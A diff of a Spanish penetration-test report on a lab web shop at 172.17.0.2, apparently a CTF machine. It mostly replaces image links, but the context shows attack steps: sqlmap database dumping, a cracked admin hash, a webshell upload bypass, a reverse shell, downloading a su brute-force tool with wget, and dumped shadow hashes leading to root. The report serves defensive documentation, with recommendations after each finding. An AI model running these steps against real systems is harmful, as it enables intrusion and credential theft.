@@ -1,6 +1,4 @@
-**Clasificación:** CONFIDENCIAL\
-**Fecha:** \[Insertar fecha\]\
-**Preparado por:** \[Tu nombre\]\
+
 **Alcance:** Evaluación de seguridad ofensiva -- Aplicación web Apple
 Store\
 **IP Objetivo:** 172.17.0.2
@@ -54,7 +52,7 @@ ping 172.17.0.2
 
 5 packets transmitted, 5 received, 0% packet los
 
-![](media/image1.png){width="5.905555555555556in" height="2.9375in"}
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/094c7eb6-1ac6-4521-a9fc-9c2267c9e931" />
 
 **Recomendación:**
 
@@ -84,7 +82,8 @@ PORT STATE SERVICE VERSION
 
 \|\_http-title: Apple Store
 
-![](media/image2.png){width="5.905555555555556in" height="2.9375in"}
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/82f0d646-1130-4a4f-9406-30a9649be155" />
+
 
 **Recomendación:**
 
@@ -112,7 +111,8 @@ whatweb http://172.17.0.2
 
 Apache\[2.4.58\], Bootstrap, HTML5, Ubuntu Linux, Title\[Apple Store\]
 
-![](media/image3.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/f9b6c5f8-49b8-4935-b32b-757672013081" />
+
 
 **Recomendación:**
 
@@ -135,12 +135,12 @@ búsqueda como puntos clave.
 
 *\[4: Interfaz normal\]*
 
-![](media/image4.png){width="5.905555555555556in" height="2.9375in"}*#5:
-Login\]*
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/7a4f3502-86fb-4703-9cd5-030330a5b819" />
 
-![](media/image5.png){width="5.905555555555556in" height="2.9375in"}\
-*\[ES*![](media/image6.png){width="5.905555555555556in"
-height="2.9375in"} *#6: DevTools Network\]*
+Login\
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/bcd968bc-c260-45e0-be6a-4ed4786ac883" />
+
+
 
 **Recomendación:**
 
@@ -177,8 +177,8 @@ ffuf -u http://172.17.0.2/FUZZ -w raft-small-directories.txt -fs 275
   -----------------------------------------------------------------------
 
 *\[Output de ffuf\]*
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8a2f3aa2-6980-4298-9c2b-d4835abf0d5a" />
 
-![](media/image7.png){width="5.905555555555556in" height="2.9375in"}
 
 **Recomendación:**
 
@@ -201,10 +201,13 @@ de bloqueo.
 
 *\[#8: Registro\]*
 
-![](media/image8.png){width="5.905555555555556in" height="2.9375in"}\
-![](media/image9.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/51954eec-e623-414c-a480-2ff8963d4fcf" />
 
-![](media/image10.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/5bad30dd-c030-4e95-9763-fe0ca2aa63bb" />
+
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/4b55e38d-0bae-4cd2-9ba5-2d2e5c69dd75" />
+
 
 **Recomendación:**
 
@@ -263,14 +266,16 @@ sqlmap -r peticion3 \--dbs \--batch \--dump
 
 *\[#11: Petición en Burp\]*
 
-![](media/image11.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/62eaa5ec-73b2-4d19-bf0f-a91030bcc05e" />
+
 
 *#12: sqlmap inyección\]*
 
-![](media/image12.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/ccc60558-f998-4973-9af7-8e8b86baba29" />
 
-*#13:* ![](media/image13.png){width="5.905555555555556in"
-height="2.9375in"}*Tabla users dumpada\]*
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/ccd86c9f-2e45-44be-af6b-a62c33ef109b" />
+
 
 **Recomendación:**
 
@@ -298,9 +303,10 @@ admin:0844575632
 
 Tiempo: \<5 segundos
 
-*\[ESPACIO PARA CAPTURA #14: CrackStation hash\]*
+#14: CrackStation hash\
 
-![](media/image14.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/fee488aa-6407-46c1-94e5-b1c1028beb2e" />
+
 
 **Recomendación:**
 
@@ -328,11 +334,12 @@ usuarios, pedidos recientes y estadísticas de ventas completas.
 
 *Dashboard admin\]*
 
-![](media/image15.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/69e15398-dc9b-4a91-b907-f53504c205b5" />
+
 
 *\[ #17: Pedidos\]*
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/d7802743-6703-45b9-beaa-c73ee5ec8cc4" />
 
-![](media/image16.png){width="5.905555555555556in" height="2.9375in"}
 
 **Recomendación:**
 
@@ -366,9 +373,9 @@ webshell (shell3.phtml) de 76 bytes fue exitosa.
 
 *#18: Burp bypass\]*
 
-![](media/image17.png){width="5.905555555555556in" height="2.9375in"}\
-*\[*![](media/image18.png){width="5.905555555555556in"
-height="2.9375in"} *#19: Directorio uploads\]*
+<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/026291da-8092-472c-b6c4-7673ba82e1d2" />
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/544d93a8-a5c8-4e1b-b503-0bf3d9e7797b" />
 
 **Recomendación:**
 
@@ -400,11 +407,13 @@ www-data@25716eb13389:\~\$ script -c bash /dev/null
 
 *Reverse shell\]*
 
-![](media/image19.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/4b8a55c4-3df7-447a-9b52-188189abea68" />
+
 
 *\[ #21: TTY upgrade\]*
 
-![](media/image20.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/95b42318-4af6-4691-9b88-49a56b07083a" />
+
 
 **Recomendación:**
 
@@ -472,10 +481,11 @@ wget https://github.com/carlospolop/su-bruteforce/archive/master.zip
 
 unzip master.zip
 
-![](media/image22.png){width="5.905555555555556in" height="2.9375in"}*:
-Descargas\]*
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/0b0f104e-3308-4584-9e34-fd33ed13f1a4" />
 
-![](media/image23.png){width="5.905555555555556in" height="2.9375in"}
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/85d67cd4-16a3-46f2-a39b-9f9068db88cb" />
+
 
 **Recomendación:**
 
@@ -501,9 +511,11 @@ bash
 
 Password: 19831983
 
-![](media/image24.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/10fd59e9-37e0-4ff5-bf56-81c6aa9a779d" />
 
-![](media/image25.png){width="5.905555555555556in" height="2.9375in"}
+
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/8d9c63da-7f9e-4904-accd-bf5f24065460" />
+
 
 **Recomendación:**
 
@@ -536,7 +548,8 @@ root:\$y\$j9T\$awXWvi2tYABgO5kreZcIi/\$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx
 
 luisillo_o:\$y\$j9T\$jeXc8lTJhOBTedetDcKHI/\$Bo6qPkbZFVsfWoTJvAZ1x0t2jG3aGsHjOjxkqOpBGg6
 
-![](media/image26.png){width="5.905555555555556in" height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/de1bf9df-37cf-447e-aae7-062f6912eb72" />
+
 
 **Recomendación:**
 
@@ -571,9 +584,10 @@ root@25716eb13389:\~*\# id*
 
 uid=0(root) gid=0(root) groups=0(root)
 
-![](media/image27.png){width="5.905555555555556in"
-height="2.9375in"}![](media/image27.png){width="5.905555555555556in"
-height="2.9375in"}
+<img width="567" height="282" alt="image" src="https://github.com/user-attachments/assets/26631452-34af-419f-9c9e-12a82060b95a" />
+
+<img width="886" height="441" alt="image" src="https://github.com/user-attachments/assets/b97e6295-daa6-4caa-b36c-245cb2ae7412" />
+
 
 **Recomendación:**
 
